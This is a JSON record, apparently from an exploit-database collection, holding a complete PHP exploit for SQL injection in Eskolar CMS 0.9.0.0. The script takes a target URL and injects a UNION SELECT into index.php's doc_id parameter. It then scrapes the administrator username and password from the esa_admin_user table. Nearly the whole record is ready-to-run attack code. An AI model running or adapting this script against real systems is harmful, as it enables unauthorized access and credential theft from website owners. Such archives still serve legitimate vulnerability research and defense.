{
  "id": "2417",
  "title": "Eskolar CMS 0.9.0.0 - &#039;index.php&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\n/*\r\n/* Eskolar CMS Remote sql injection exploit\r\n/*            By : HACKERS PAL\r\n/*             WwW.SoQoR.NeT\r\n*/\r\nprint_r('\r\n/**********************************************/\r\n/* Eskolar CMS Remote sql injection exploit   */\r\n/*     by HACKERS PAL <security@soqor.net>    */\r\n/*         site: http://www.soqor.net         */');\r\n\r\nif ($argc<2) {\r\n\tprint_r('\r\n/* --                                         */\r\n/* Usage: php '.$argv[0].' host\r\n/* Example:                                   */\r\n/*    php '.$argv[0].' http://localhost/eskolar/\r\n/**********************************************/\r\n');\r\n\tdie;\r\n}\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\n$url=$argv[1];\r\n$exploit=\"/index.php?gr_1_id=0&gr_2_id=0&gr_3_id=1&doc_id=10%20union%20select%201,2,3,4,5,6,7,8,password,10,11,12,13,14,15,16,user,18,19,20,21,22,23,24,25,26%20FROM%20esa_admin_user/*\";\r\n$page=$url.$exploit;\r\n\r\nFunction get_page($url)\r\n{\r\n\tif(function_exists(\"file_get_contents\"))\r\n\t{\r\n\t\t$contents = file_get_contents($url);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$fp=fopen(\"$url\",\"r\");\r\n\t\twhile($line=fread($fp,1024))\r\n\t\t{\r\n\t\t\t$contents=$contents.$line;\r\n\t\t}\r\n\t}\r\n\treturn $contents;\r\n}\r\n\r\n$i=0;\r\n\r\nfunction get($var)\r\n{\r\n\tGLOBAL $i;\r\n\t$var[1]=trim($var[1]);\r\n\tif($i==0)\r\n\t{\r\n\t\tEcho \"\\n[+] User Name : \".$var[1];\r\n\t\t$i++;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tEcho \"\\n[+] Pass Word : \".$var[1];\r\n\t}\r\n}\r\n\r\n$page = get_page($page);\r\n\r\nif(!preg_match('/\\<tr bgcolor=\\'#FF0000\\'><td><div align=\\'center\\'>(.+?)<\\/div><\\/td><\\/tr>/is',$page)||!preg_match('/\\<td><a href=\\\"(.+?)\\\" target=\\\"_blank\\\">(.+?)<\\/a> <\\/td>/is',$page))\r\n{\r\n\tDie(\"\\n[-] Exploit Failed\\n/* Visit us : WwW.SoQoR.NeT                   */\\n/**********************************************/\");\r\n}\r\n\r\npreg_replace_callback('/\\<tr bgcolor=\\'#FF0000\\'><td><div align=\\'center\\'>(.+?)<\\/div><\\/td><\\/tr>/is','get',$page);\r\npreg_replace_callback('/\\<td><a href=\\\"(.+?)\\\" target=\\\"_blank\\\">(.+?)<\\/a> <\\/td>/is','get',$page);\r\nDie(\"\\n/*       Visit us : WwW.SoQoR.NeT             */\\n/**********************************************/\");\r\n?>\r\n\r\n# milw0rm.com [2006-09-22]",
  "url": "https://www.exploit-db.com/exploits/2417"
}